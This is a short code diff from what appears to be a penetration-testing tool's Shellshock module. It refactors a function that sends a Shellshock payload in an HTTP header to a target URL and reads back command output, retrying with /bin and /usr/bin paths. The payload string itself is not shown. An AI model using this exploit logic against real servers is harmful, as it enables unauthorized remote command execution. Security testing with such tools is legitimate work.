       payload = shellshock_exploitation(cve, cmd)
-
-      # Check if defined "--verbose" option.
-      if menu.options.verbose:
-        sys.stdout.write("\n" + Fore.GREY + settings.PAYLOAD_SIGN + payload + Style.RESET_ALL)
-
       header = { check_header : payload }
       request = urllib2.Request(url, None, header)
       response = urllib2.urlopen(request)
       shell = response.read().rstrip()
-      return shell
+      return shell, payload
 
-    except urllib2.URLError, err:
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + str(err) + Style.RESET_ALL
+    except urllib2.URLError, err_msg:
+      print "\n" + settings.print_error_msg(err_msg)
       sys.exit(0)
 
-  shell = check_for_shell(url, cmd, cve, check_header, filename)
+  shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
   if len(shell) == 0:
     cmd = "/bin/" + cmd
-    shell = check_for_shell(url, cmd, cve, check_header, filename)
+    shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
+    if menu.options.verbose and len(shell) > 0:
+      sys.stdout.write("\n" + settings.print_payload(payload))
     if len(shell) == 0:
       cmd = "/usr" + cmd
-      shell = check_for_shell(url, cmd, cve, check_header, filename)
+      shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
+      if menu.options.verbose and len(shell) > 0:
+        sys.stdout.write("\n" + settings.print_payload(payload))
 
-  return shell
+  return shell, payload
 
 """
 The exploitation function.
